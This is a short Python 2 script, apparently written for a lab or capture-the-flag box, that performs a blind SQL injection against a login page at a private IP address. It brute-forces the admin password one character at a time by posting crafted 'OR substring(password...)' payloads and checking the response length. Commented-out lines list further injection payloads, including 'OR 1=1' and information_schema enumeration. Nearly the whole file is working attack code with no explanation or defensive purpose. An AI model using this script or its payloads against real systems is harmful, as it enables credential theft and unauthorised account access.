import requests
import re
import sys

password_regex = re.compile(r"(`\w+\.[a-z0-9]{5,26})`")

def printgreen(text):
    print '\033[92m' + text + '\033[0m'

def send_req():
    acceptable = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_{}"
    password = ""
    #SELECT SUBSTRING('hello', 3, 1)
    #elect column_name from table_name where id='input' and Ascii(substring('n00b',1,1))>100;
    #nd Ascii(substring((Select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>97%23
    #page.php?id=1' and (select 1 from dual where (select password from users where username like '%admin%' limit 0,1) like '%')%23
    while True:
        for char in acceptable:
            #attack = "' and SUBSTRING((select password from users where username = 'admin'), 1,1) = 'f" 
            #attack = "password' OR '1'='1" 
            #attack = "password' and Ascii(substring(password,1,1))<200 and '1'='1"
            #attack = "password' OR password like '}%"
            attack = "password' OR substring(password,1," + str(len(password) + 1) + ") = '" + password + char
 
            r = requests.post("http://192.168.0.11/login.php", data={'username': "admin", 'password': attack})
            
            #print len(r.text)
            if (len(r.text) == 42):
                printgreen(char)
                password+=char
                print password
                break
            else:
                print char
#            print r.text
               
    print password

if __name__ == '__main__':
    try:
        send_req()
    except:
        print "quit"

'''
SELECT SUBSTRING((select ContactName from Customers where CustomerName = 'Alfreds Futterkiste'), 1,3) AS ExtractString
FROM Customers;

SUBSTRING((select ContactName from Customers where CustomerName = 'Alfreds Futterkiste'), 1,3) = 'Mar';        
'''